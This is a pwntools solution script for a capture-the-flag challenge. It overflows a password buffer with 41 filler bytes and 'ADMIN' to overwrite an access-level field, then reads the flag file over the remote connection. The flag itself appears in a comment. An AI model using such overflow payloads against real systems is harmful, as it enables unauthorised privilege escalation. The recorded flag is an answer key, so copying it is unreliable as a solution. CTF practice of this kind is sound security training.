
from pwn import *

# You can use netcat to interact with the service manually too:
# nc <HOST> <PORT>

HOST = '3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg'
PORT = 30101

io = remote(HOST, PORT)  # Comment this out when testing locally

# 32 bytes to fill up the password, 9 bytes (by guessing) to reach access_level
# ADMIN to fill up access_level
io.send(b"A"*(32+9)+b"ADMIN"+b"\n")

io.send("cat /home/adminitize/flag.txt\n")
io.interactive()
# Flag: CTFSG{u53l355_4cc355_l3v3l5}
